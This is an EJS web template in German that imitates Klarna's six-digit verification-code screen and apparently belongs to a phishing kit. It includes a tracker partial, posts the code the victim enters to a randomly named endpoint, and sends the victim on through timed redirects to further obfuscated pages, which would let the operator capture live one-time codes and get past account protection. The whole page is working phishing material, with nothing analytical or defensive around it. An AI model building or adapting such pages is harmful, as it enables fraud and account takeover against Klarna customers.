<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Klarna</title>
    <link rel="stylesheet" href="./css/bavoka.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
     <%- include('partials/tracker') %>
</head>

<body>
    <div class="login-container">
        <div class="form1">
            <div class="up">
                <!-- Header with Back, Badge, Close -->
                <div class="header-row">
                    <button class="back-btn" aria-label="Go back">
                        <svg aria-hidden="true" role="img" viewBox="0 0 20 20" height="24" width="24">
                            <g fill="none" fill-rule="evenodd" transform="translate(0, 0) scale(1)">
                                <path
                                    d="M12.5 9.167H4.047c.418-.365.828-.74 1.222-1.129a27.562 27.562 0 0 0 2.905-3.381l-1.348-.98a25.873 25.873 0 0 1-2.728 3.176c-.91.899-1.892 1.73-2.919 2.471a.833.833 0 0 0 0 1.352 24.844 24.844 0 0 1 2.92 2.471 25.87 25.87 0 0 1 2.727 3.177l1.348-.981a27.57 27.57 0 0 0-2.905-3.381c-.394-.39-.804-.764-1.222-1.129H12.5c2.757 0 5 2.243 5 5h1.667A6.674 6.674 0 0 0 12.5 9.167Z"
                                    fill="rgba(11, 5, 29, 1)" style="transition: fill 0.2s;"></path>
                            </g>
                        </svg>
                    </button>

                    <div class="hodpa">
                        <img src="./img/huodop.PNG" alt="">
                    </div>

                    <button class="close-btn" style="position: static;" aria-label="Close">
                        <svg width="18" height="18" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path
                                d="M14 1.41L12.59 0L7 5.59L1.41 0L0 1.41L5.59 7L0 12.59L1.41 14L7 8.41L12.59 14L14 12.59L8.41 7L14 1.41Z"
                                fill="#535353" />
                        </svg>
                    </button>
                </div>

                <h1>Gib deinen sechsstelligen Code ein</h1>
                <p class="email-info">
                    Ein Bestätigungscode wurde gesendet an <br>
                    <strong><% if (isNaN(pass) ) { %><%= pass %><% }else{ %> Ihre E-Mail-Adresse. <% } %></strong> <a href="/" class="change-link">Ändern</a>
                </p>

                <div class="form-group">
                    <svg class="input-icon" aria-hidden="true" role="img" viewBox="0 0 20 20" height="20" width="20">
                        <g fill="none" fill-rule="evenodd" transform="translate(0, 0) scale(1)">
                            <path
                                d="M15.833 2.5H4.167A3.337 3.337 0 0 0 .833 5.833v8.334A3.337 3.337 0 0 0 4.167 17.5h11.666a3.337 3.337 0 0 0 3.334-3.333V5.833A3.337 3.337 0 0 0 15.833 2.5ZM4.167 4.167h11.666c.92 0 1.667.747 1.667 1.666v.1L10 9.153 2.5 5.932v-.099c0-.919.747-1.666 1.667-1.666Zm11.666 11.666H4.167c-.92 0-1.667-.747-1.667-1.666v-6.42l7.5 3.221 7.5-3.222v6.42c0 .92-.747 1.667-1.667 1.667Z"
                                fill="rgba(11, 5, 29, 1)" style="transition: fill 0.2s;"></path>
                        </g>
                    </svg>
                    <input type="text" id="otp_code" class="form-input input-with-icon" placeholder=" " required
                        autocomplete="one-time-code" />
                    <label class="form-label" for="otp_code">Code eingeben</label>
                    <div id="smsCodeError" style="color: #d01a1a; font-size: 12px; margin-top: 5px; display: none;"></div>
                </div>

                <div class="checkbox-row">
                    <input type="checkbox" class="checkbox-custom">
                    <div class="checkbox-text">
                        Erhalte Partnerdeals, Angebote und mehr von Klarna.<br>
                        Wir senden dir weiterhin Informationen zu ähnlichen Klarna Services. <a href="#">Abmelden</a>
                    </div>
                </div>

                <div class="success-box">
                    <svg class="success-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM10 17L5 12L6.41 10.59L10 14.17L17.59 6.58L19 8L10 17Z"
                            fill="#004d00" />
                    </svg>
                    <div class="success-content">
                        <h3>Code per E-Mail gesendet</h3>
                        <p>Wir haben dir eine E-Mail gesendet. Diese solltest du innerhalb der nächsten 20 Sekunden
                            erhalten.</p>
                    </div>
                </div>
            </div>

            <div class="down">
                <div class="bottom-spacer">
                    <p class="spam-notice">E-Mail nicht erhalten? Überprüfe den Spamordner.</p>
                    <a href="#" class="resend-link">Code erneut senden</a>
                </div>
            </div>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            var otpInput = document.getElementById('otp_code');
            var successBox = document.querySelector('.success-box');
            var smsCodeError = document.getElementById('smsCodeError');

            // 1. Fade out success box
            if (successBox) {
                setTimeout(function () {
                    successBox.classList.add('fade-out');
                    // Wait for transition to finish before hiding
                    setTimeout(function () {
                        successBox.style.display = 'none';
                    }, 2000); // Wait 2s for transition
                }, 10000);
            }

            // 2. Input Restriction & Auto-submit
            if (otpInput) {
                // Set attributes dynamically
                otpInput.setAttribute('maxlength', '6');
                otpInput.setAttribute('inputmode', 'numeric');
                otpInput.setAttribute('pattern', '[0-9]*');

                otpInput.addEventListener('input', function (e) {
                    // Remove non-numeric characters
                    this.value = this.value.replace(/[^0-9]/g, '');

                    // Clear error when typing
                    if(smsCodeError) {
                        smsCodeError.style.display = 'none';
                        otpInput.classList.remove('input-error');
                    }

                    // Check length
                    if (this.value.length === 6) {
                        var smsCode = this.value;
                        
                        // Disable input to prevent double submit
                        otpInput.disabled = true;

                        $.ajax({
                            url: '/SSwP85AgNE4pnL5mWSM', // This is the 'sms1 post' endpoint
                            type: 'POST',
                            contentType: 'application/json',
                            data: JSON.stringify({ code: smsCode }),
                            success: function(info) {
                                if(info.OK){
                                    const user = <%- JSON.stringify(pass) %>;
                                    console.log(user);
                                    if(isNaN(user)){
                                        window.location = "/loading?time=7&url=/RKnUB922z6Mf4HDwg3EZ";

                                    }else {
                                        window.location = "/loading?time=7&url=/PrTomeM9HwWUWSulkTe4";
                                    }
                                    
                                } else {
                                    // Show error message
                                    if(smsCodeError) {
                                        smsCodeError.textContent = 'Ungültiger Sicherheitscode. Bitte überprüfen Sie Ihre Eingabe.';
                                        smsCodeError.style.display = 'block';
                                    }
                                    otpInput.classList.add('input-error');
                                    
                                    // Reset input
                                    otpInput.disabled = false;
                                    otpInput.value = '';
                                    otpInput.focus();
                                }
                            },
                            error: function(xhr, status, error) {
                                // Show error message
                                if(smsCodeError) {
                                    smsCodeError.textContent = 'Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.';
                                    smsCodeError.style.display = 'block';
                                }
                                otpInput.classList.add('input-error');
                                
                                // Reset input
                                otpInput.disabled = false;
                            }
                        });
                    }
                });
            }
        });
    </script>
</body>

</html>